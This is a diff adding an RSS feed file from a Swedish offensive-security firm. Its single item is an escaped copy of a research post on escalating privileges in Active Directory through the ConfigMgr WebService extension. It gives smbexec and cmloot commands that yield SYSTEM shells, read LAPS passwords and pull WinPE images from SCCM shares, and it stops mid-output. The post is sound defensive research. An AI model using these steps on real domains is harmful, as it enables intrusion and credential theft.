@@ -1,0 +1,473 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Research on Shelltrail - Swedish offensive security experts</title>
+    <link>https://www.shelltrail.com/research/</link>
+    <description>Recent content in Research on Shelltrail - Swedish offensive security experts</description>
+    <generator>Source Themes academia (https://sourcethemes.com/academic/)</generator>
+    <language>en-us</language>
+    <copyright>Copyright &amp;copy; {year}</copyright>
+    <lastBuildDate>Tue, 10 Oct 2023 00:00:00 +0000</lastBuildDate>
+    
+	    <atom:link href="https://www.shelltrail.com/research/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Microsoft Configuration Manager - New attack paths using ConfigMgr WebService extension</title>
+      <link>https://www.shelltrail.com/research/microsoft-endpoint-configuration-manager-webservices/</link>
+      <pubDate>Tue, 10 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.shelltrail.com/research/microsoft-endpoint-configuration-manager-webservices/</guid>
+      <description>&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://msendpointmgr.com/configmgr-webservice/&#34;&gt;ConfigMgr WebService&lt;/a&gt;, a third-party extension used to simplify custom Operating System Deployment (OSD) for
+Microsoft Configuration
+Manager adds features to interact with Configuration Manager, MDT and Active Directory which under
+certain situations can be exploited to escalate privileges in an Active
+Directory domain. While the extension is considered legacy by the developer, it may still be
+prevalent in several environments.&lt;/p&gt;
+&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
+&lt;p&gt;As part of the research surrounding Microsoft Configuration Manager, Shelltrail has investigated a open source
+third-party tool used in OS deployments which interacts with Configuration Manager, MDT and Active
+Directory. The tool in question contains two parts, a WebService
+endpoint called &lt;a href=&#34;https://msendpointmgr.com/configmgr-webservice/&#34;&gt;ConfigMgr WebService&lt;/a&gt; and a .NET GUI application named &lt;a href=&#34;https://msendpointmgr.com/configmgr-osd-frontend/&#34;&gt;ConfigMgr OSD FrontEnd&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The tools adds the functionality to create custom Operating System Deployment sequences
+via &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; which exposes a GUI during Windows Preinstallation
+Environment (WinPE) where a user or administrator can customize and define
+the deployment process by means of using input and checkboxes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-showing-osd-frontend-during-pentest.png&#34; alt=&#34;Image showing OSD FrontEnd during pentest&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; (&lt;code&gt;OSDFrontEnd.exe&lt;/code&gt;) self-service GUI simplifies
+the customization process as the alternative would be for a Configuration manager
+administrator to build, and deploy a custom Task Sequence which can be time consuming.&lt;/p&gt;
+&lt;p&gt;Most options, configuration and ability to communicate with &lt;em&gt;ConfigMgr WebService&lt;/em&gt;
+for &lt;code&gt;OSDFrontEnd.exe&lt;/code&gt; comes from &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt;
+which is provided in the OSDFrontEnd enabled WinPE PXE bootable image.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-showing-file-structure-on-a-security-assessment.png&#34; alt=&#34;Image showing file structure on a security assessment&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;configmgr-webservice-authentication&#34;&gt;ConfigMgr WebService authentication&lt;/h2&gt;
+&lt;p&gt;As unauthenticated access to the &lt;em&gt;ConfigMgr WebService&lt;/em&gt; could have severe consequences, a basic
+authentication mechanism is used, where a secret access key is generated upon installation of
+the WebService. The access key is generated as an unguessable type-4 UUID and stored in the &lt;code&gt;web.config&lt;/code&gt;
+file in the root of the IIS web application.&lt;/p&gt;
+&lt;p&gt;Upon issuing requests to the WebService the &lt;code&gt;WebServiceSecret&lt;/code&gt; need to be supplied and if
+it matches the configured key, the request is authorized. As the &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; need to
+know this key in order to make use of the functionality, it is included in the &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt;
+file together with the endpoint with which to interact, as seen in the image below.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;web-config-during-active-directory-security-assessment.png&#34; alt=&#34;Image showing web.config during Active Directory security assessment&#34;&gt;&lt;/p&gt;
+&lt;p&gt;By obtaining the &lt;code&gt;WebServiceSecretKey&lt;/code&gt;, communication can be established with the
+&lt;em&gt;ConfigMgr WebService&lt;/em&gt;. From here on different exploitation paths may exist, depending on
+how the service account is configured for the IIS AppPool running &lt;em&gt;ConfigMgr WebService&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;active-directory-attributes-during-internal-security-assessment.png&#34; alt=&#34;Image showing active directory attributes during internal security assessment&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;configmgr-webservice-permissions&#34;&gt;ConfigMgr WebService permissions&lt;/h2&gt;
+&lt;p&gt;During the setup of &lt;em&gt;ConfigMgr WebService&lt;/em&gt; the service account used in IIS
+is specified during the &lt;code&gt;Specify Application Pool Identity&lt;/code&gt; which can be seen
+in &lt;code&gt;ConfigMgr WebService 1.8.0 - Installation Guide.pdf&lt;/code&gt; from &lt;a href=&#34;https://github.com/MSEndpointMgr/ConfigMgrWebService/releases&#34;&gt;ConfigMgr.WebService.1.8.0.zip&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;security-settings-service-account.png&#34; alt=&#34;Service account in Active Directory&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This service account, which this research essentially is all about, is the key
+to keep the environment secure. If this service account is configured with higher
+privileges than intended, it may lead to privilege escalations in various ways.&lt;/p&gt;
+&lt;p&gt;The documentation for &lt;em&gt;ConfigMgr WebService&lt;/em&gt; regarding the service accounts&#39;
+permissions can be found in three places&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ConfigMgr WebService 1.8.0 - Installation Guide.pdf - page 3
+&lt;ul&gt;
+&lt;li&gt;&lt;img src=&#34;security-permissions-1.png&#34; alt=&#34;IT security permissions&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;ConfigMgr OSD FrontEnd 1.6.0 - Documentation.pdf - page 35
+&lt;ul&gt;
+&lt;li&gt;&lt;img src=&#34;security-permissions-2.png&#34; alt=&#34;IT security permissions&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/NickolajA/ConfigMgrWebService&#34;&gt;https://github.com/NickolajA/ConfigMgrWebService&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;img src=&#34;security-permissions-3.png&#34; alt=&#34;IT security permission&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As the recommended permissions sometimes contradict each other, and may be
+quite limited in explanation, administrators may lack proper information
+when delegating permissions and end up with an overly privileged service account.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s highlight the risks of various permissions.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;To highlight some of the exploitation paths that can be used with the exposed
+WebService, we&amp;rsquo;ve set up a test environment and misconfigured the service account
+used by the WebService in various ways.&lt;/p&gt;
+&lt;p&gt;Of course, setting up the service account as a member in &lt;code&gt;Domain Admins&lt;/code&gt; is probably
+the worst scenario where exploitation by WebServices such as &lt;code&gt;AddADUserToGroup&lt;/code&gt; or
+&lt;code&gt;AddADComputerToGroup&lt;/code&gt; should be apparent. While rare, configurations such as this are
+encountered from time to time.&lt;/p&gt;
+&lt;p&gt;To make it a bit more tricky, we&amp;rsquo;ve set up a slightly less obvious configuration where
+the following setup of Organizational Units (OU) in the Active Directory is used, which
+is not uncommon.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;active-directory-security-organizational-units.png&#34; alt=&#34;Active Directory security organizational units&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ve also added the permission of &lt;code&gt;Modify the membership of a group&lt;/code&gt; to the service
+account to the root of the OU &lt;code&gt;CORP&lt;/code&gt;, in order for it to be able to make use of
+some of the exposed WebServices.&lt;/p&gt;
+&lt;h3 id=&#34;addadcomputertogroup&#34;&gt;AddADComputerToGroup&lt;/h3&gt;
+&lt;p&gt;We will test out the first functionality of &lt;em&gt;ConfigMgr WebService&lt;/em&gt;. Namely
+&lt;code&gt;AddADComputerToGroup&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;exploitation-of-active-directory-group-membership.png&#34; alt=&#34;Exploitation of Active Directory group membership&#34;&gt;&lt;/p&gt;
+&lt;p&gt;What happened? Local administrator permissions on &lt;code&gt;DEMOMACHINE&lt;/code&gt; was given to
+the computer &lt;code&gt;mylaptop&lt;/code&gt; via the custom group &lt;code&gt;Local Administrators - DEMOMACHINE&lt;/code&gt;
+which was located in the OU structure.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbexec.py test.local/mylaptop&lt;span style=&#34;color:#ae81ff&#34;&gt;\$&lt;/span&gt;@DEMOMACHINE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Password:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[!] Launching semi-interactive shell - Careful what you execute
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Windows\system32&amp;gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nt authority\system
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;C:\Windows\system32&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Of course this is a fictitious setup however these types of unintended permissions
+exist in most if not all Active Directory environment.&lt;/p&gt;
+&lt;p&gt;This is caused by unintended
+inheritance in Active Directory where the administrator gave the
+&lt;em&gt;ConfigMgr WebService&lt;/em&gt; service account
+&lt;code&gt;Modify the memership of a group&lt;/code&gt; to the root if the OU &lt;code&gt;CORP&lt;/code&gt;, which included
+the group &lt;code&gt;Local Administrators - DEMOMACHINE&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;internal-network-security-for-active-directory.png&#34; alt=&#34;Internal network security for Active Directory&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To fix this careful planning of what OU&amp;rsquo;s the service account are allowed to modify
+is required.&lt;/p&gt;
+&lt;h3 id=&#34;getadcomputerattributevalue&#34;&gt;GetADComputerAttributeValue&lt;/h3&gt;
+&lt;p&gt;So let&amp;rsquo;s explore how reading a computer attribute can be exploited to move laterally
+or escalate privileges. One way would be if Local Administrator Password Solution
+(LAPS) is misconfigured:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;gaining-laps-password-on-internal-pentest.png&#34; alt=&#34;Gaining LAPS password on internal pentest&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ smbexec.py administrator:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Mhr9;3KO5}X%6e&amp;#39;&lt;/span&gt;@SRV01
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[!] Launching semi-interactive shell - Careful what you execute
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Windows\system32&amp;gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nt authority\system
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;C:\Windows\system32&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;addadusertogroup&#34;&gt;AddADUserToGroup&lt;/h3&gt;
+&lt;p&gt;But what if LAPS is not misconfigured? Then misconfigure it by adding the service account
+to the to the fictitious &lt;code&gt;LAPS Password readers&lt;/code&gt;-group using the handy AddADUserToGroup command:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;exploitation-of-laps-during-active-directory-security-assessment.png&#34; alt=&#34;Exploitation of LAPS during Active Directory security assessment&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Then fetch &lt;code&gt;ms-mcs-admpwd&lt;/code&gt; via &lt;code&gt;GetADComputerAttributeValue&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Would it also be possible to add a user to &lt;code&gt;Domain Admins&lt;/code&gt;? Of course, however this
+requires the service account to have permission in either the domain-root or
+in the &lt;code&gt;Users&lt;/code&gt; container.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;active-directory-security-ous.png&#34; alt=&#34;Active Directory security OU&amp;amp;rsquo;s&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;getaduserattributevalue&#34;&gt;GetADUserAttributeValue&lt;/h3&gt;
+&lt;p&gt;Further on it is also possible to enumerate all computers and users with the &lt;code&gt;GetADUserAttributeValue&lt;/code&gt;-service
+by inserting wildcard in LDAP queries.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;user-enumeration-active-directory.png&#34; alt=&#34;User enumeration Active Directory&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;user-enumeration-via-brute-force.png&#34; alt=&#34;User enumeration via brute force&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With a full user dump of Active Directory users, password spraying and AS-REP attacks are
+possible attacks that could be used.&lt;/p&gt;
+&lt;p&gt;Another classic is to enumerate the &lt;strong&gt;description&lt;/strong&gt; field of the Active Directory users,
+where administrators sometimes put passwords:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;common-active-directory-security-vulnerability.png&#34; alt=&#34;Common Active Directory security vulnerability&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;setadcomputermanagedby&#34;&gt;SetADComputerManagedBy&lt;/h3&gt;
+&lt;p&gt;The &lt;code&gt;ManagedBy&lt;/code&gt; Active Directory attribute should not be confused with the &lt;code&gt;Owner&lt;/code&gt;
+attribute.
+Being &lt;code&gt;Owner&lt;/code&gt; of a Active Directory computer object indirectly means administrator
+access via the ShadowCredentials attack or Resource Based Constrained Delegation which
+is not applicable in this case.
+However &lt;code&gt;ManagedBy&lt;/code&gt; have two interesting aspects. If &lt;code&gt;ManagedBy&lt;/code&gt; is used on a
+Active Directory group it is possible to allow the manager to modify membership.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;rodcs-security-misconfiguration.png&#34; alt=&#34;RODCs security misconfiguration&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Even though the &lt;a href=&#34;https://github.com/NickolajA/ConfigMgrWebService/blob/master/ConfigMgrWebService/ConfigMgrWebService.asmx.cs#L5835C63-L5835C111&#34;&gt;LDAP query&lt;/a&gt; used to lookup
+the computer concatenates the user input into the query, basically meaning
+LDAP injection.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;ldap-injection-vulnerability.png&#34; alt=&#34;LDAP injection vulnerability&#34;&gt;&lt;/p&gt;
+&lt;p&gt;No ways of escaping the &lt;em&gt;objectClass=computer&lt;/em&gt; was found which
+means that Active Directory groups cannot be modified with the
+&lt;code&gt;SetADComputerManagedBy&lt;/code&gt; feature.&lt;/p&gt;
+&lt;p&gt;The other interesting aspect is if the &lt;code&gt;ManagedBy&lt;/code&gt; attribute is used in conjunction
+with Read-Only Domain Controllers (RODC).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;remote-code-execution-on-active-directory-read-only-domain-controller.png&#34; alt=&#34;Remote code execution on Active Directory read-only domain controller&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The principal configured in the &lt;code&gt;ManagedBy&lt;/code&gt; attribute becomes the
+&lt;a href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/73d11ea7-e634-453e-944d-559654cc91c5&#34;&gt;local administrator on the RODC&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;managedby2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ smbexec.py test.local/test-lowpriv:&amp;#39;Flowahpowah1&amp;#39;@rodc01
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[!] Launching semi-interactive shell - Careful what you execute
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\Windows\system32&amp;gt;whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nt authority\system
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;more-recon&#34;&gt;More recon&lt;/h2&gt;
+&lt;p&gt;Until now all attacks originates from having PXE bootable network access with the
+ability to boot a WinPE configured with &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt;. This limitation
+can be extended in three ways.&lt;/p&gt;
+&lt;p&gt;In order to include &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; to a bootable WinPE the source files must
+be injected to the image. In order for this to work Configuration Manager
+requires &lt;em&gt;Source directory&lt;/em&gt; for the &lt;em&gt;ConfigMgr OSD FrontEnd&lt;/em&gt; files
+to be imported via a UNC path:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;configuration-manager-security-share.png&#34; alt=&#34;Configuration Manager security share&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Everybody calm down, I&amp;rsquo;ve got this&lt;/em&gt; the administrator says, right-clicks the
+folder, chooses share and done.&lt;/p&gt;
+&lt;p&gt;What just happened is a very common issue in Windows corporate environments. As the
+default permissions on a local folder outside of home folders for example, includes
+&lt;code&gt;&amp;lt;computername&amp;gt;\Users&lt;/code&gt; with read permissions:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;active-directory-security-tab-on-share.png&#34; alt=&#34;Active Directory security tab on share&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Which via nesting includes &lt;code&gt;&amp;lt;domain&amp;gt;\Domain Users&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;internal-security-review-of-windows-users.png&#34; alt=&#34;Internal security review of Windows - Users&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now every authenticated user in the domain has the permissions to access the secret
+key in the &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt; file.&lt;/p&gt;
+&lt;h2 id=&#34;more-recon-2&#34;&gt;More recon #2&lt;/h2&gt;
+&lt;p&gt;OK, so the &lt;code&gt;sources&lt;/code&gt; folder in the previous example is now properly secured and
+no means of obtaining the &lt;code&gt;OSDFrontEnd.exe.config&lt;/code&gt; is possible. But wait&amp;hellip;&lt;/p&gt;
+&lt;p&gt;We turn to our nifty tool &lt;a href=&#34;https://github.com/shelltrail/cmloot&#34;&gt;cmloot.py&lt;/a&gt;, to
+index all files in the SCCM inventory:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@pentest:~$ cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20231004.192432.3760dfc6 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Access to SCCMContentLib
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] sccmfiles.txt created
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@pentest:~/cmloot$
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As the WinPE&amp;rsquo;s are distributed to the Distribution Points running the Configuration
+Manager PXE service it will be stored in the &lt;code&gt;SCCMContentLib$&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ cat sccmfiles.txt | grep &amp;#39;\.wim&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00002.3\boot.XYZ00002.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00006.9\winpe_dotnet.XYZ00006.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00007.3\winpe.XYZ00007.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ0000C.2\winpe.XYZ0000C.wim
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cmloot.py test.local/test-lowpriv@sccm01 -n -cmlootdownload sccmfiles.txt -extensions wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.11.0 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;wim&amp;#39;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 7E2C-boot.XYZ00002.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 007F-winpe_dotnet.XYZ00006.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 9599-winpe.XYZ00007.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 4B5C-winpe.XYZ0000C.wim
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;.wim&lt;/code&gt; files can easily be extracted with 7-zip:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/CMLootOut$ 7z x 007F-winpe_dotnet.XYZ00006.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz (806EC),ASM,AES-NI)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Scanning the drive for archives:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1 file, 425193731 bytes (406 MiB)
